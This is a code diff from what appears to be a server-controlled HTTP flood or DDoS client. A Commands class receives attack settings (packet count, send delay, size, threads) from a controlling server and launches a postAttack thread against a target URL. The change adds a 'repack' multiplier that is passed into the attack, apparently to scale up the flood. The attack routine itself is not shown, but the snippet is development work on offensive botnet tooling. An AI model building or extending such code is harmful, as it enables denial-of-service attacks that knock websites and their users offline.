@@ -102,6 +102,9 @@ class Commands:
     packets: int = int(self.data.recieve(server))
     print(f"{data[0]}: PACKETS -> {packets}")
 
+    repack: int = int(self.data.recieve(server))
+    print(f"{data[0]}: MULTIPLIER -> {repack}")
+
     senddelay: int = int(self.data.recieve(server))
     print(f"{data[0]}: SEND DELAY -> {senddelay}")
 
@@ -112,7 +115,7 @@ class Commands:
     print(f"{data[0]}: THREADS -> {threads}")
     print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
     sleep(0.1)
-    Thread(target=self.attacks.postAttack, args=(blacklisted, server, url, packets, senddelay, size, threads)).start()
+    Thread(target=self.attacks.postAttack, args=(blacklisted, server, url, packets, repack, senddelay, size, threads)).start()
   
   
   
